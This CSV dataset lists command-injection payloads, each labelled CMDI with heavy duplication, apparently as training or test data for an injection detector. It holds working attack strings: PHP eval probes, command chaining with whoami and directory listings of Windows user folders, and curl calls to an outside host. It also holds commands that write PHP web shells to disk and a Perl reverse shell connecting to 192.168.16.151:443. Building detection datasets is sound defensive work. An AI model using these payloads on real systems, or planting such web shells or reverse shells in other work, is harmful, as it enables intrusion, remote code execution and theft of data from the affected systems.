payload,attack
 {${phpinfo()}},CMDI
 {${phpinfo()}},CMDI
 {${phpinfo()}},CMDI
 {${phpinfo()}},CMDI
 {${sleep(20)}},CMDI
 {${sleep(20)}},CMDI
 {${sleep(3)}},CMDI
 {${sleep(3)}},CMDI
 {${sleep(hexdec(dechex(20)))}} ,CMDI
 {${sleep(hexdec(dechex(20)))}} ,CMDI
 & whoami,CMDI
 & whoami,CMDI
 & whoami,CMDI
 & whoami,CMDI
 && whoami,CMDI
 && whoami,CMDI
 && whoami,CMDI
 && whoami,CMDI
 || whoami,CMDI
 || whoami,CMDI
 || whoami,CMDI
 || whoami,CMDI
" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
 whoami,CMDI
 whoami,CMDI
 whoami,CMDI
 whoami,CMDI
; ,CMDI
; curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
; curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
; curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
; curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
; dir,CMDI
; dir,CMDI
; dir,CMDI
; dir,CMDI
; dir C:\,CMDI
; dir C:\,CMDI
; dir C:\,CMDI
; dir C:\,CMDI
; dir C:\Documents and Settings\*,CMDI
; dir C:\Documents and Settings\*,CMDI
; dir C:\Documents and Settings\*,CMDI
; dir C:\Documents and Settings\*,CMDI
; dir C:\Users,CMDI
; dir C:\Users,CMDI
; dir C:\Users,CMDI
; dir C:\Users,CMDI
"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
